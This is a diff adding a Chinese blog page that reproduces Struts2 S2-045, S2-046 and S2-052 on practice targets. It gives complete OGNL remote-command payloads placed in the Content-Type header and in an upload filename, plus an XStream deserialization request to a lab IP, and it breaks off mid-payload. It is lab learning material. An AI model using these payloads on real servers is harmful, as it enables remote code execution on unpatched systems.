@@ -1,0 +1,764 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="S2-045这个是一个rce 漏洞 0x00  这是一个模拟的上传文件的一个页面 尝试上传文件，然后抓包  修改content-type 1Content-Type:&quot;%&amp;#123;(#nike&#x3D;&amp;#x27;multipart&#x2F;form-data&amp;#x27;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AU9U5T">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/10/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="S2-045这个是一个rce 漏洞 0x00  这是一个模拟的上传文件的一个页面 尝试上传文件，然后抓包  修改content-type 1Content-Type:&quot;%&amp;#123;(#nike&#x3D;&amp;#x27;multipart&#x2F;form-data&amp;#x27;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215034104.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215148081.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215442544.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215654668.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210220414316.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210220612371.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210220843498.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210221708111.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210222300007.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210222723131.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210222945072.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210223829532.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210223952438.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210224020375.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210225959509.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/20240210230151.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210230317175.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210230819514.png">
+<meta property="article:published_time" content="2024-02-10T13:32:51.871Z">
+<meta property="article:modified_time" content="2024-02-10T15:09:09.678Z">
+<meta property="article:author" content="August Rosenberg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215034104.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-10 21:32" pubdate>
+          February 10, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          74 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h1><p>这个是一个rce 漏洞</p>
+<p>0x00</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215034104.png" srcset="/img/loading.gif" lazyload alt="image-20240210215034104"></p>
+<p>这是一个模拟的上传文件的一个页面</p>
+<p>尝试上传文件，然后抓包</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215148081.png" srcset="/img/loading.gif" lazyload alt="image-20240210215148081"></p>
+<p>修改content-type</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Content-Type:<span class="hljs-string">&quot;%&#123;(<span class="hljs-subst">#nike</span>=&#x27;multipart/form-data&#x27;).(<span class="hljs-subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="hljs-subst">#_memberAccess</span>?(<span class="hljs-subst">#_memberAccess</span>=<span class="hljs-subst">#dm</span>):((<span class="hljs-subst">#container</span>=<span class="hljs-subst">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(<span class="hljs-subst">#ognlUtil</span>=<span class="hljs-subst">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(<span class="hljs-subst">#ognlUtil</span>.getExcludedPackageNames().clear()).(<span class="hljs-subst">#ognlUtil</span>.getExcludedClasses().clear()).(<span class="hljs-subst">#context</span>.setMemberAccess(<span class="hljs-subst">#dm</span>)))).(<span class="hljs-subst">#cmd</span>=&#x27;whoami&#x27;).(<span class="hljs-subst">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(<span class="hljs-subst">#cmds</span>=(<span class="hljs-subst">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class="hljs-subst">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class="hljs-subst">#cmd</span>&#125;)).(<span class="hljs-subst">#p</span>=new java.lang.ProcessBuilder(<span class="hljs-subst">#cmds</span>)).(<span class="hljs-subst">#p</span>.redirectErrorStream(true)).(<span class="hljs-subst">#process</span>=<span class="hljs-subst">#p</span>.start()).(<span class="hljs-subst">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(<span class="hljs-subst">#process</span>.getInputStream(),<span class="hljs-subst">#ros</span>)).(<span class="hljs-subst">#ros</span>.flush())&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意这个是一行</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215442544.png" srcset="/img/loading.gif" lazyload alt="image-20240210215442544"></p>
+<p>发现顺利的返回结果</p>
+<h1 id="S2-046"><a href="#S2-046" class="headerlink" title="S2_046"></a>S2_046</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210215654668.png" srcset="/img/loading.gif" lazyload alt="image-20240210215654668"></p>
+<p>0x00</p>
+<p>还是一样模仿的一个文件上传的界面</p>
+<p>和上面的那个一样的，只是利用的地方不一样而已</p>
+<p>还是抓包，然后修改filename</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210220414316.png" srcset="/img/loading.gif" lazyload alt="image-20240210220414316"></p>
+<p>发现利用成功</p>
+<p>然后将 filename 修改为</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#nike=<span class="hljs-string">&#x27;multipart/form-data&#x27;</span>).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;b<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210220612371.png" srcset="/img/loading.gif" lazyload alt="image-20240210220612371"></p>
+<p>注意使用00截断一下</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210220843498.png" srcset="/img/loading.gif" lazyload alt="image-20240210220843498"></p>
+<p>发现利用成功</p>
+<h1 id="S2-052"><a href="#S2-052" class="headerlink" title="S2_052"></a>S2_052</h1><p>由于线上的靶场开启的速度太慢了，所以还是使用本地的</p>
+<p>0x00</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210221708111.png" srcset="/img/loading.gif" lazyload alt="image-20240210221708111"></p>
+<p>发现这个</p>
+<p>0x01</p>
+<p>直接使用payload </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/orders/3</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>120.26.80.77:8080<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>2063<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span> </span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span> </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">cipher</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">initialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">initialized</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">opmode</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">opmode</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">serviceIterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.util.Collections$EmptyIterator&quot;</span>/&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>touch<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/tmp/success<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">redirectErrorStream</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">redirectErrorStream</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span></span><br><span class="language-xml">                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span></span><br><span class="language-xml">                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;string&quot;</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;/<span class="hljs-name">serviceIterator</span>&gt;</span></span><br><span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">lock</span>/&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;/<span class="hljs-name">cipher</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">ibuffer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ibuffer</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">done</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">done</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">ostart</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ostart</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">ofinish</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ofinish</span>&gt;</span></span><br><span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">closed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">closed</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span> </span><br><span 